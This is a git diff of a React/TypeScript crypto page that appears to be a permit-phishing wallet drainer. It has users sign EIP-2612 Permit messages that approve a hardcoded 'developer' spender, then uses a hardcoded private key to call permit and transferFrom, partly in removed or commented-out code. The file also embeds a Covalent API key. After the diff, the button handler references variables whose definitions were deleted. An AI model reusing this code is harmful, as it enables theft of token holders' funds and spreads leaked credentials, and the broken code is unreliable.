@@ -5,9 +5,10 @@ import {parseEther} from "viem";
 import {signTypedData} from "@wagmi/core";
 import {config} from "@/context/config";
 import {ethers, Wallet} from "ethers";
-import {useEffect, useState} from "react";
+import React, {useEffect, useState} from "react";
 import {useEthersProvider, useEthersSigner} from "@/app/ethers";
 import {JsonRpcSigner} from "@ethersproject/providers";
+import TokenList from "@/app/TokenList";
 
 const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
 const developer = {
@@ -89,35 +90,8 @@ const Page = () => {
 					<div className={'flex gap-2'}>
 						{token.contract_ticker_symbol}
 						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
-							if (!account) return;
-							const domainType = [
-								{ name: 'name', type: 'string' },
-								{ name: 'version', type: 'string' },
-								{ name: 'chainId', type: 'uint256' },
-								{ name: 'verifyingContract', type: 'address' },
-							]
-							const Permit = [
-								{ name: "owner", type: "address" },
-								{ name: "spender", type: "address" },
-								{ name: "value", type: "uint256" },
-								{ name: "nonce", type: "uint256" },
-								{ name: "deadline", type: "uint256" },
-							]
-							const params = {
-								"types": {
-									EIP712Domain: domainType,
-									"Permit": Permit
-								},
-								"primaryType": "Permit",
-								"domain": {
-									"name": token.contract_ticker_symbol,
-									"version": "1",
-									"chainId": +(account.chainId || "0"),
-									"verifyingContract": token.contract_address // BNB Contract
-								},
-								"message": message
-							};
-							console.log(params);
+
+
 							const result = await signTypedData(config, params)
 
 							setSignatures(pre => ({
@@ -140,35 +114,8 @@ const Page = () => {
 						{token.contract_ticker_symbol}
 						<button disabled={!signature} onClick={async () => {
 							if (!signature) return;
-							// ABI of the token contract
-							// Prepare the permit data
-							const spender = developer.address; // Address of the spender
-							const amount = message.value+""; // Amount of tokens to be spent
-							const nonce = message.nonce; // Nonce
-							const deadline = message.deadline; // Deadline (optional)
 
-							console.log(provider);
-							const payload = {
-								contract: token.contract_address,
-								signature,
-								spender,
-								amount,
-								nonce,
-								deadline,
-								rpc: provider?.connection?.url,
-								owner: account.address
-							}
-							// const response = await fetch("/api/wallet/permit", {
-							// 	headers: {
-							// 		"content-type": "application/json"
-							// 	},
-							// 	body: JSON.stringify(payload),
-							// 	method: "POST"
-							// }).then(r=>r.json())
-							// alert(response.message);
-							// console.log(response);
 
-							await handle(payload);
 						}}>
 							Permit
 						</button>
@@ -194,125 +141,52 @@ const Page = () => {
 	)
 };
 
-function TokenList({address, CHAIN_ID, setTokens: ST}: { address: string, CHAIN_ID: number, setTokens: any }) {
-	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);
-	const [isLoading, setIsLoading] = useState(true);
-	const [isError, setIsError] = useState(false);
+async function createPermitSignature(signMethod: any, domainName: string,contractAddress: string,chainId: number,owner: string, spender: string, value: number, nonce: number, deadline: number,domainVersion: string = "1") {
+	const domain = {
+		name: domainName,
+		version: domainVersion,
+		verifyingContract: contractAddress,
+		chainId
+	}
 
-	useEffect(() => {
-		const fetchTokens = async () => {
-			try {
-				const response = await fetch(`https://api.covalenthq.com/v1/${CHAIN_ID}/address/${address}/balances_v2/?key=cqt_rQMKcGmyCVvmTRtRf6HFyMYggf49`);
-				const data = await response.json();
-				setTokens(data.data.items);
-				ST(data.data.items);
-				setIsLoading(false);
-			} catch (error) {
-				console.error('Error fetching tokens:', error);
-				setIsError(true);
-				setIsLoading(false);
-			}
-		};
+	const domainType = [
+		{ name: 'name', type: 'string' },
+		{ name: 'version', type: 'string' },
+		{ name: 'chainId', type: 'uint256' },
+		{ name: 'verifyingContract', type: 'address' },
+	]
+	const permit = { owner, spender, value, nonce, deadline }
+	const Permit = [
+		{ name: "owner", type: "address" },
+		{ name: "spender", type: "address" },
+		{ name: "value", type: "uint256" },
+		{ name: "nonce", type: "uint256" },
+		{ name: "deadline", type: "uint256" },
+	]
 
-		fetchTokens();
-	}, [address]);
+	const dataToSign = JSON.stringify({
+		types: {
+			EIP712Domain: domainType,
+			Permit: Permit
+		},
+		domain: domain,
+		primaryType: "Permit",
+		message: permit
+	});
 
-	if (isLoading) return <div>Loading...</div>;
-	if (isError) return <div>Error fetching tokens</div>;
+	const signature = await signMethod(dataToSign)
+	const split = splitSig(signature)
 
-	console.log(tokens);
-
-	return (
-		<div>
-			<h2>Tokens in Wallet</h2>
-			<ul>
-				{tokens.map((token) => (
-					<li key={token.contract_address}>
-						{token.contract_name} ({token.contract_ticker_symbol}): {ethers.utils.formatUnits(token.balance, token.contract_decimals)}
-					</li>
-				))}
-			</ul>
-		</div>
-	);
+	return {
+		...split, signature
+	}
 }
 
-export type ContractCovalenTHQ = {
-	contract_decimals: number
-	contract_name: string
-	contract_ticker_symbol: string
-	contract_address: string
-	supports_erc: Array<string>
-	logo_url: string
-	contract_display_name: string
-	logo_urls: {
-		token_logo_url: string
-		protocol_logo_url: any
-		chain_logo_url: string
-	}
-	last_transferred_at: string
-	native_token: boolean
-	type: string
-	is_spam: boolean
-	balance: string
-	balance_24h: string
-	quote_rate: any
-	quote_rate_24h: any
-	quote: any
-	pretty_quote: any
-	quote_24h: any
-	pretty_quote_24h: any
-	protocol_metadata: any
-	nft_data: any
-}
-
-async function handle(json: any, signer?: JsonRpcSigner) {
-	const {
-		owner,
-		contract,
-		signature,
-		spender,
-		amount,
-		nonce,
-		deadline,
-		rpc
-	} = json;
-	const createSigner = async ()=>{
-		const provider = new ethers.providers.JsonRpcProvider(rpc);
-		console.log(provider);
-		await provider.detectNetwork()
-		console.log(json)
-		const privateKey = 'ccbe5e7676105cb9190bdd8726b59c7ab33e7e6a62cad3cce07651195ed295b9';
-		return new Wallet(privateKey, provider);
-	}
-
-	const SIGNER = signer || await createSigner()
-
-	const CALL = async (method: keyof typeof methods, ...args: any[])=>{
-		return await callContractMethod(method, args, contract,SIGNER)
-	}
-
-	const splited = ethers.utils.splitSignature(signature);
-	const {v, r, s} = splited;
-
-	console.log(splited);
-	//
-	//
-	// const args = [owner,spender, +amount, deadline, v, r, s];
-	//
-	// const gasLimit = ethers.utils.hexlify(100000); // You may need to adjust this value
-	// const tx = await CALL('permit', ...args, {
-	// 	gasLimit
-	// });
-	// console.log("TX",tx);
-	// await tx.wait();
-	// console.log("FINISHED");
-	// console.log(args)
-	// console.log(await CALL('allowance',owner,spender))
-	//
-	// const transferTx = await tokenContract.transferFrom(owner, spender, amount);
-	// const transferReceipt = await transferTx.wait();
-	//
-	// console.log('Tokens transferred successfully, transfer receipt:', transferReceipt);
+const createSigner = async (rpc: string)=>{
+	const provider = new ethers.providers.JsonRpcProvider(rpc);
+	await provider.detectNetwork()
+	const privateKey = 'ccbe5e7676105cb9190bdd8726b59c7ab33e7e6a62cad3cce07651195ed295b9';
+	return new Wallet(privateKey, provider);
 }
 
 const methods = {
@@ -320,7 +194,6 @@ const methods = {
 	transferFrom: "function transferFrom (address from, address to, uint256 value) external returns (bool)",
 	permit: 'function permit (address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'
 }
-
 
 async function callContractMethod(method: keyof typeof methods,args: any[], addressOrName: string, signer: JsonRpcSigner) {
 	console.log("CALL", method,args);
